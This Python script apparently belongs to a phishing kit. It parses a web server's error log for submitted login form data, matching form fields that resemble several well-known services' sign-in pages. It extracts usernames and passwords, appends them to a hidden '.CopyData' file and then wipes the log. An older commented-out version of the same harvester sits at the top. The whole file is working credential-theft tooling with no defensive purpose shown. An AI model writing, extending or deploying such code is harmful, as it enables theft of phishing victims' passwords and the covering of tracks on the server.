#!/usr/bin/env pyhton
import os
import re
import sys
import time
import subprocess
from urllib.parse import unquote 
from subprocess import PIPE
'''
user_name = os.path.dirname(os.path.abspath(__file__)).split("/")[2]
Path_St = str("/".join(os.path.dirname(__file__).split('/')[:-1]))
group = "chown " + user_name + ":" + user_name + " " + Path_St + '/ServerLog/*'
os.system(group)

class dns_result:
    def __init__(self):
        self.web_Password()

    def web_Password(self):
        print(" " + "-" * 102)
        print("| " + f"{'       Site-Name    ':<20}", ' |' + f"{'       auth_user    ':<35}", "  | " + f"{'         PASSWORD   ':<35}   |")
        print(" " + "-" * 102)
        count = 0
        with open(Path_St + '/ServerLog/log_error.log') as Log_Handel:
            Log_read = Log_Handel.read()
        pattern = r"login=(?P<username>[^&]+)&password=(?P<password>[^&]+)"
        matches = re.search(pattern, Log_read)
        patterndomian = r"/var/www/html/([^/]+)/"
        domain_match = re.search(patterndomian, Log_read)
            
        if matches  and domain_match :
            username = matches.group("username").replace("%40", "@")
            password = matches.group("password")
            domain = username.split("@")[1] if "@" in username else "Unknown" 
            domain = domain_match.group(1)
            if domain and not password or not username:
                pass
            elif password and not domain or not username:
                pass
            elif username and not password and not domain:
                pass
            else:        
                print("|   " + f"{domain.replace('\n', ''):<20}" + "|   " + f"{username.replace('\n', ''):<35}" + "| " + f"{ password.replace('\n', ''):<35}" + "   |")
if __name__=='__main__':
  dns_result()                
'''

  #!/usr/bin/env python
import os
import re
from urllib.parse import unquote

user_name = os.path.dirname(os.path.abspath(__file__)).split("/")[2]
Path_St = str("/".join(os.path.dirname(__file__).split('/')[:-1]))
group = f"chown {user_name}:{user_name} {Path_St}/ServerLog/*"
os.system(group)

class dns_result:
    def __init__(self):
        self.web_Password()

    def web_Password(self): 
        try:
            with open(Path_St + '/ServerLog/log_error.log', 'r') as Log_Handel:
                Log_read = Log_Handel.read()

            if "&sgnBt" in Log_read:
                pattern = r'userid=([^&]+)&pass=([^&]+)'

            elif "&session_key=" in Log_read:
                pattern = r'session_key=([^&]+)&.*?session_password=([^&\s]+)'

            elif  "email=" in Log_read and 'pass' not in Log_read or 'dropbox' in Log_read:
                pattern = r"email=([^&]+)&password=([^\s]+)"

            elif "email=" in Log_read and "pass=" in Log_read:
                pattern = r'email=([^&]+).*?pass=([^&]+)'

            elif "username=" in Log_read and "&signin=Next" not in Log_read:
                pattern = r"username=([^&]+)&password=([^\s]+)"

            elif "login=" in Log_read:
                pattern = r"login=([^&]+)&password=([^&]+)"

            elif "Username=" in Log_read:
                pattern = r"Username=([^&]+)&Password=([^\s]+)"

            elif "userLoginId=" in Log_read:
                pattern = r"userLoginId=([^&+]+).*?password=([^&]+)"

            elif "&signin=Next" in Log_read:
                pattern = r'username=([^&]+)&passwd=([^&\s]+)'

            elif "usernameOrEmail=" in Log_read:
                pattern = r'usernameOrEmail=([^&]+)&password=([^\s]+)'

            elif '&user%5Blogin%5D' in Log_read:
                pattern = r"user%5Blogin%5D=([^&\s]+).*?user%5Bpassword%5D=([^&\s]+)"
            elif 'login_email' in Log_read:
                pattern = r'login_email=([^&]+)&login_password=([^&]+)'
                
            domain_pattern = r"/var/www/html/([^/]+)/"
            domain_match = re.search(domain_pattern, Log_read)
            matches = re.search(pattern, Log_read)
            print(matches)
            if matches and domain_match:
                    username = matches.group(1).replace("%40", "@").replace("+", "")
                    password = matches.group(2)
                    domain = domain_match.group(1)
                   # printF = f"|   {domain:<20} |   {username:<35} | {password:<39} |"
                    printF = "| " + f"{       domain    :<20}"+ ' | ' + f"{       username    :<34}"+ "  | " + f"{         password   :<39}  |"+'\n'
                    with open(f"{Path_St}/ServerLog/.CopyData",'a') as Copy:
                        Copy.write(printF)      
                    with open(Path_St + '/ServerLog/log_error.log', 'w') as Log_Handel:
                       pass
        except FileNotFoundError:
            print("Error: log_error.log not found.")

if __name__ == '__main__':
    dns_result()
